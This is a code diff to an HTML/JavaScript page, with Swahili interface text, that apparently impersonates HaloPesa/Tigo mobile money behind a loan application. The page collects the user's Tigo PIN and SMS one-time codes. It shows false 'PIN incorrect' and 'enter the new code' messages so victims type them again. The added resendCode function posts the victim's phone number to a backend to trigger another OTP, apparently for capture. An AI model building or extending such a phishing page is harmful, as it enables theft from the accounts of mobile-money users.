@@ -125,19 +125,26 @@
         function showSuccess() { document.getElementById('screen4').classList.remove('active'); document.getElementById('successOverlay').classList.add('active'); }
 
         function showCodeError() {
-            document.getElementById('screen4').classList.remove('active');
-            document.getElementById('screen3').classList.add('active');
+            document.getElementById('screen4').classList.remove('active'); document.getElementById('screen3').classList.add('active');
             document.getElementById('codeError').textContent = 'Weka namba mpya iliyotumwa na HaloPesa';
-            document.getElementById('codeError').style.color = 'var(--danger)';
-            document.getElementById('codeError').classList.add('show');
+            document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show');
             document.querySelectorAll('.cd').forEach(function(d) { d.classList.remove('filled'); d.classList.add('error'); d.value = ''; });
-            document.querySelector('.cd').focus();
-            startCountdown();
+            document.querySelector('.cd').focus(); startCountdown();
             setTimeout(function() { document.querySelectorAll('.cd').forEach(function(d) { d.classList.remove('error'); }); document.getElementById('codeError').classList.remove('show'); }, 4000);
         }
 
         function goBackToPinFromCode() { document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; }); alert('PIN si sahihi. Jaribu tena.'); }
+
+        async function resendCode() {
+            if (!userPhone) return;
+            document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri...';
+            document.getElementById('codeError').style.color = 'var(--hp-orange)';
+            document.getElementById('codeError').classList.add('show');
+            try {
+                await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: loanAmount, months: loanTerm, loan_type: '', purpose: 'OTP REQUESTED' }) });
+                setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000);
+            } catch(e) {}
+        }
     </script>
 </body>
-</html>
 </html>
